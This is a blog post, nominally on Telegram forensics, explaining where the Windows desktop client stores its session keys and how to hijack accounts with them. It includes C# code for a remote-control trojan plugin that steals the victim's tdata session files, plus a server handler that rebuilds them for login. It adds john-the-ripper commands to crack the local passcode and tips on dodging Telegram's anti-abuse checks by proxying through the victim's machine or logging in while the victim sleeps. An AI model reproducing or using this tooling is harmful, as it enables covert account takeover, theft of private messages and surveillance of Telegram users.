---
title: Telegram取证相关的记录
date: 2023-4-15 05:40:56
categories: 
- Forensics
tags:
- Forensics
- Telegram
---
因为各种原因，接触了一些场景要对Telegram进行信息收集，这里就记录下基本思路，只涉及Windows的官方客户端

# 1.关于tdata

正常安装的Telegram会安装至 `%appdata%\Telegram Desktop`，在这个目录中 `modules`文件夹存放了一个D3D的dll，`tdata`文件夹存放所有数据，`unins000.exe/unins000.dat`文件是卸载相关，`Updater.exe`是升级程序。所以对我们最有意义的就是这个 `tdata`文件夹。

在 `tdata`文件夹中，保存着登录信息及本地缓存的聊天及文件等，主要关注登录信息部分即可

## **key_datas**

保存了解密其他文件的主密钥 `localKey`

## **D877F783D5D3EF8Cs**

存储了用户的userId，以及此session的通信密钥

## **D877F783D5D3EF8C/maps**

存储了用户的基本信息和一些配置

## 多用户登录的情况

对于有多个用户登录的Telegram，会有其他类似D877F783D5D3EF8C的存在，根据命名方法可以按照顺序生成为

```
D877F783D5D3EF8C
A7FDF864FBC10B77
F8806DD0C461824F
C2B05980D9127787
0CA814316818D8F6
……
```

# Session劫持

综上所属，存在 `key_datas，D877F783D5D3EF8Cs，D877F783D5D3EF8C/maps`三个文件即包含登录使用的所有信息，也就足够进行劫持

对于多用户登录的场景，可以根据情况下载其他用户的对应文件，附此前远控内提取Telegram相关的客户端插件及服务端处理函数

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Threading;
using System.Text;

namespace Creeper
{
    public static class Program
    {
        private static readonly string Telegram = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
        public static string pluginMain(string[] args)
        {
            if (!Directory.Exists(Telegram)) return new string[] { "Log", "Not Found Telegram" };
            string[] paths =
            {
                "tdata\\key_datas",
                "tdata\\D877F783D5D3EF8Cs",
                "tdata\\D877F783D5D3EF8C\\maps",
                "tdata\\A7FDF864FBC10B77s",
                "tdata\\A7FDF864FBC10B77\\maps",
                "tdata\\F8806DD0C461824Fs",
                "tdata\\F8806DD0C461824F\\maps",
                "tdata\\C2B05980D9127787s",
                "tdata\\C2B05980D9127787\\maps",
                "tdata\\0CA814316818D8F6s",
                "tdata\\0CA814316818D8F6\\maps",
            };
            StringBuilder sb = new StringBuilder();
            foreach (var path in paths)
            {
                if (File.Exists(Path.Combine(Telegram, path)))
                {
                    sb.Append(path);
                    sb.Append("-=>");
                    sb.Append(Convert.ToBase64String(File.ReadAllBytes(Path.Combine(Telegram, path))));
                    sb.Append("-=>");
                }
            }
            if (sb.Length>0)
            {
                return new string[] { "telegram", sb.ToString() };
            }
            return new string[] { "Log", "Not Found Telegram" };
        }
    }
}
```

```csharp
using System;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;

namespace Demo
{
    internal class Program
    {
        static void Telegram(string message)
        {
            string tempPath = Path.Combine(Application.StartupPath, "Output",  "Telegram");
            if (!Directory.Exists(tempPath))
            {
                Directory.CreateDirectory(tempPath);
            }
            if (!Directory.Exists(tempPath + "\\tdata"))
                Directory.CreateDirectory(tempPath + "\\tdata");

            if (!Directory.Exists(tempPath + "\\tdata\\D877F783D5D3EF8C"))
                Directory.CreateDirectory(tempPath + "\\tdata\\D877F783D5D3EF8C");
            if (!Directory.Exists(tempPath + "\\tdata\\A7FDF864FBC10B77"))
                Directory.CreateDirectory(tempPath + "\\tdata\\A7FDF864FBC10B77");
            if (!Directory.Exists(tempPath + "\\tdata\\F8806DD0C461824F"))
                Directory.CreateDirectory(tempPath + "\\tdata\\F8806DD0C461824F");
            if (!Directory.Exists(tempPath + "\\tdata\\C2B05980D9127787"))
                Directory.CreateDirectory(tempPath + "\\tdata\\C2B05980D9127787");
            if (!Directory.Exists(tempPath + "\\tdata\\0CA814316818D8F6"))
                Directory.CreateDirectory(tempPath + "\\tdata\\0CA814316818D8F6");

            string[] sb = message.Split(new[] { "-=>" }, StringSplitOptions.None);
            for (int i = 0; i < sb.Length; i++)
            {
                if (sb[i].Length > 0)
                {
                    try
                    {
                        File.WriteAllBytes(Path.Combine(tempPath, sb[i]), Convert.FromBase64String(sb[i + 1]));
                    }
                    catch { }
                }
                i += 1;
            }
            Process.Start("explorer.exe", tempPath);
        }
    }
}

```

获取关键文件后，即可直接使用最新版Telegram客户端exe配合进行登录，如果需要可以直接使用客户端自带的导出功能进行取证

注：去年年底以来，同session多地登录有可能触发TG官方的防滥用机制，所以劫持需谨慎，建议在目标机器上搭建反向代理并通过代理访问劫持的Telegram Session，或者错峰登录在对方休息时结束目标机器Telegram进程并自己本地登录

# 本地登录密码

很多人会为Telegram设置本地登录密码，可以使用[john-the-ripper](https://github.com/openwall/john/tree/bleeding-jumbo)进行爆破。

```
python .\run\telegram2john.py "\path\to\Telegram Desktop\tdata\key_datas" > .\tg.hash
#报错的话，不要按照提示安装PyCrypto，改为安装pycryptodome
.\run\john.exe --format=telegram --wordlist=password.txt ./tg.hash
```

注:报错的话，不要按照提示安装PyCrypto，改为安装pycryptodome

# 消息记录提取

在劫持Session后有时候不方便使用Telegram的客户端自带的导出，也是为了大批量自动化考虑，可以使用第三方客户端进行消息记录的提取

过程较为复杂，且没有完整优雅的代码实现，就不放成品了，大概思路如下

使用[opentele](https://github.com/thedemons/opentele/)将tdata转为[Telethon](https://github.com/LonamiWebs/Telethon)可用的session，之后进行具体消息提取的实现

提取时可以忽略公开群组及公开频道的消息，可以大幅提高速度

# 未完待续

……
